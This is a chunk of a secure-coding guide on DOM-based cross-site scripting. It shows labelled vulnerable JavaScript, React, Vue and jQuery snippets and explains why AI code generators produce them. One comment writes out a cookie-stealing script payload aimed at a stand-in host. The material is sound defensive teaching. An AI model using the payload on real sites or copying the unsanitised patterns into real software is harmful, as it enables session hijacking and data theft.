---
source: "languages/javascript/xss.md"
title: "Cross-Site Scripting (XSS) — DOM-Based"
heading: "How AI / Vibe Coding Generates This"
category: "language-vuln"
language: "javascript"
severity: "critical"
tags: [checklist, code, explanation, javascript, language-vuln, prevention, secure, vulnerability, vulnerable]
chunk: 3/8
---

## How AI / Vibe Coding Generates This

### 1. innerHTML in Vanilla JavaScript (Most Common)

```javascript
// 🚫 VULNERABLE — AI-generated dynamic content
function displayUserComment(comment) {
  // AI uses innerHTML to insert user content
  document.getElementById('comments').innerHTML += `
    <div class="comment">
      <p>${comment.text}</p>  <!-- 💥 XSS -->
      <small>${comment.author}</small>  <!-- 💥 XSS -->
    </div>
  `;
}

// Attacker submits comment with: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

### 2. dangerouslySetInnerHTML in React

```javascript
// 🚫 VULNERABLE — AI-generated React component
function UserProfile({ bio }) {
  // AI uses dangerouslySetInnerHTML to render rich text
  return (
    <div
      className="profile-bio"
      dangerouslySetInnerHTML={{ __html: bio }}  // 💥 XSS!
    />
  );
}

// The bio comes from user input — attacker embeds malicious scripts
```

### 3. Vue.js v-html

```vue
<!-- 🚫 VULNERABLE -- AI-generated Vue template -->
<template>
  <div v-html="userContent"></div>  <!-- 💥 XSS -->
</template>
```

### 4. jQuery .html() and .append()

```javascript
// 🚫 VULNERABLE — AI-generated jQuery code
$('#results').html(searchResults);  // 💥 XSS
$('#comments').append(commentHTML);  // 💥 XSS
```

### 5. document.write()

```javascript
// 🚫 VULNERABLE — AI-generated analytics snippet
document.write(`<script src="https://analytics.example.com/track?user=${userId}"></script>`);
// 💥 If userId contains ", the script tag breaks and arbitrary HTML/JS can be injected
```

### 6. URL Fragment/DOM Clobbering

```javascript
// 🚫 VULNERABLE — AI-generated URL parameter handling
const tab = window.location.hash.substring(1);  // e.g., #admin
document.querySelector(`#${tab}`).innerHTML = "Active";  // 💥 DOM clobbering
```

### Why AI Does This

- **innerHTML is taught early:** Every JS tutorial uses innerHTML. Training data is saturated.
- **"dangerouslySetInnerHTML" is a known API name:** AI models remember the name but often omit the sanitization step
- **Text interpolation is intuitive:** `${userInput}` in template literals feels "safe" — AI doesn't distinguish between text nodes and HTML nodes
- **React's JSX escaping creates false confidence:** AI thinks JSX auto-escapes everything, but `dangerouslySetInnerHTML` bypasses it
- **No CSRF/XSS threat model:** AI doesn't model the attacker's ability to control inputs

---